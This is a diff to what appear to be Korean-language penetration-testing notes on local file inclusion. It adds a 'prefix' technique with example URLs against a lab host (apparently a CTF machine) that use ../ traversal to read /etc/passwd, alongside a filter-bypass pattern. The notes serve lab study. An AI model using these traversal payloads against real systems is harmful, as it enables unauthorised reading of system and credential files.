@@ -283,6 +283,16 @@ http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
 
 ```
 
+#### 접두사 추가
+```bash
+# 원본
+http://10.129.23.214/department/manage.php?notes=files/ninevehNotes.txt
+
+# 접두사 테스트
+http://10.129.23.214/department/manage.php?notes=files/ninevehNotes/../../../../etc/passwd
+http://10.129.23.214/department/manage.php?notes=/ninevehNotes/../../../../etc/passwd
+```
+
 #### 다양한 필터 우회 기법
 ```bash
 ..././           # 점 3개 슬래시
